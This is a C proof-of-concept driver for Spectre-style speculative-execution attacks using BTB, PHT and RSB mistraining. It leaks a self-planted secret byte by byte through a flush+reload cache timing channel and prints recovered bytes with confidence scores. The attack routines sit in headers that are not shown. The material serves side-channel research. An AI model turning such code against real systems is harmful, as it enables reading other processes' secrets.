#include <stdint.h>
#include <stdio.h>
//#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#include "sidechannel/flush_reload.h"
#include "defines.h"
#include "btb/btb.h"
#include "rsb/rsb.h"
#include "pht/pht.h"



char* oracle_block;
int junk;
int* results;
char* victim_block;
void (*testfun) (void*);
unsigned int array1_size = 16;




void readMemoryBrace(void* info, uint8_t value[2], int score[2]){
    static int tries, i, j, k, mix_i;

    for (i = 0; i < 256; i++){
        results[i] = 0;
    }
    for (tries = TRIES; tries > 0; tries--) {
        
        // begin substitution area
        _mm_mfence();
        testfun(info);
        //btb_atk(info);
        //rsb_atk(info);
        //pht_atk(info);
        // end substitution area
        
        _mm_mfence();
        probe(oracle_block,CACHE_MISS, PAGESIZE, results);
        _mm_mfence();


        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
            k = j;
            j = i;
            } else if (k < 0 || results[i] >= results[k]) {
            k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */

    }
    value[0] = (uint8_t) j;
    score[0] = results[j];
    value[1] = (uint8_t) k;
    score[1] = results[k];
}


int main(int argc, const char **argv) {
    // Detect cache threshold
    char* secret = SECRET;
    size_t len = sizeof(SECRET) - 1;

    char cc;
    char* testobj;
    int i, score[2];
    uint8_t value[2];

    // setup flush-reload channel
    oracle_block = malloc(256 * PAGESIZE);
    memset(oracle_block, 1, 256*PAGESIZE);
    flush(oracle_block, PAGESIZE);

    // setup score block
    results = malloc(256*sizeof(int));
    memset(results,0,256*sizeof(int));

    // initialise victim block: first, allocate memory
    victim_block = malloc(array1_size + len);


    // then, fill with 16 "visible" elements, then with secret
    for (int i = 0; i < array1_size + len; i++){
        if (i < 16){
            victim_block[i] = i;
            continue;
        }
        victim_block[i] = secret[i - 16];
    }

    _mm_mfence();


    // actual tests
    int t = 1;
    for (int t = 0; t < 3; t++){
        switch (t)
        {
        case 0:
            testobj = "btb";
            testfun = &btb_atk;
            break;
        case 1:
            testobj = "pht";
            testfun = &pht_atk;
            break;
        case 2:
            testobj = "rsb";
            testfun = &rsb_atk;
            break;
        }
        printf("%s test...\n", testobj);
        for (i = 0; i < len; i++) {
            //cc = secret[i]; // precomputation of character to extract
            //printf("Attempting to read %c... ", cc);
            printf("Reading at malicious_x = %d... ", i);
            if (testfun == &btb_atk){
                readMemoryBrace(secret + i, value, score);
            } else if (testfun == &rsb_atk){
                cc = secret[i];
                readMemoryBrace(cc, value, score);
            } else if (testfun == &pht_atk){
                readMemoryBrace(array1_size + i, value, score);
            }
            
            printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
            printf("0x%02X='%c' score=%d ", value[0],
                (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);
            if (score[1] > 0)
                printf("(second best: 0x%02X score=%d)", value[1], score[1]);
            printf("\n");
        }
    }
    
    free(oracle_block);

    return (0);
}
